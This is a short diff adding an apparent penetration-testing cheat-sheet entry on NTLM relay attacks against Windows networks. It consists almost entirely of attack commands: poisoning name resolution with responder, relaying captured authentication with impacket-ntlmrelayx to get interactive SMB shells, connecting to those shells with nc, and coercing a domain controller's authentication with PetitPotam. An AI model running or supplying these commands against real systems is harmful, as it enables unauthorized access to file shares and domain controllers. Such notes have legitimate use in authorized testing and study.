@@ -1,0 +1,11 @@
+SMBClient Shell via NTLM Relay
+  $ responder -I eth0 -rdvw
+  $ impacket-ntlmrelayx -tf NTLMRELAYTARGETS.txt -smb2support -i
+  
+Connection to Interactive Shells
+  $ nc 127.0.0.1 <Port>
+  $ shares
+  $ use <DirectoryName>
+
+Especially if you want to get SMBClient shell on DC, trigger PetitPotam luckyboi
+  $ python3 Petitpotam.py <KaliIP> <DCIP> -d <DomainName>
